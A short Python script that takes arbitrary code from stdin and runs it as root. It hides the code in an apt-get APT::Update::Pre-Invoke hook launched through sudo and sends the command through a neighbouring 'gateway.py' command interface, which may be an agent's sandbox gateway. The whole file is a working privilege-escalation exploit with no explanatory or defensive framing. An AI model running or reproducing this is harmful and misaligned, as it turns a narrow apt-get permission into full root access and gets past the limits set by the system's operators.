import json,subprocess,sys,shlex,pathlib
code=sys.stdin.read()
# The pre-invoke hook deliberately fails before any update is attempted.
hook='python3 -c '+shlex.quote(code)+'; exit 73'
remote='import subprocess; a='+repr(['/usr/bin/sudo','/usr/bin/apt-get','-o','Debug::NoLocking=1','-o','APT::Update::Pre-Invoke::='+hook,'-o','Dir::Etc::sourcelist=/dev/null','-o','Dir::Etc::sourceparts=-','update'])+'; p=subprocess.run(a,capture_output=True,text=True,timeout=15); print(p.stdout.split("Reading package lists...")[0]); print(p.stderr); print("helper_exit",p.returncode)'
payload={'command':['python3','-c',remote],'timeoutMs':20000}
p=subprocess.run([sys.executable,str(pathlib.Path(__file__).with_name('gateway.py'))],input=json.dumps(payload),text=True,capture_output=True,timeout=30)
try:
 d=json.loads(p.stdout); print(d.get('stdout',d)); print(d.get('stderr',''))
except Exception: print(p.stdout,p.stderr)
